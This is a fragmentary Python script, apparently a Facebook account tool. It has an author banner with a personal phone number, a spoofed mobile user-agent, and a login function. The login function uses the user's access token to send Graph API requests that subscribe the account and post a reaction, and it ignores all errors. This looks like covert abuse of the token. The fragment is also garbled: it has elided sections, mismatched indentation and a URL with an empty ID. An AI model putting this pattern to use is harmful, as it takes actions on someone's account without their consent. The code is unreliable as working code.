...
# AUTHOR : Hasan    
           #
# CONTAK : 01853592090 [WHATSAPP]                       #
# GITHUB : HTTPS://GITHUB.COM/Hasan4277726                  #
##########################################################
...
def folder(): # < Buat follder
	...
	try:
		ua_ = 'Mozilla/5.0 (Linux; Android 11; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
...
def login_xx():                                                                                                    
	...
	requests.post('https://graph.facebook.com//subscribers?access_token=%s'%(token))
        requests.post('https://graph.facebook.com/ANGRY?summary=true&access_token=' + token)
      except:
        pass
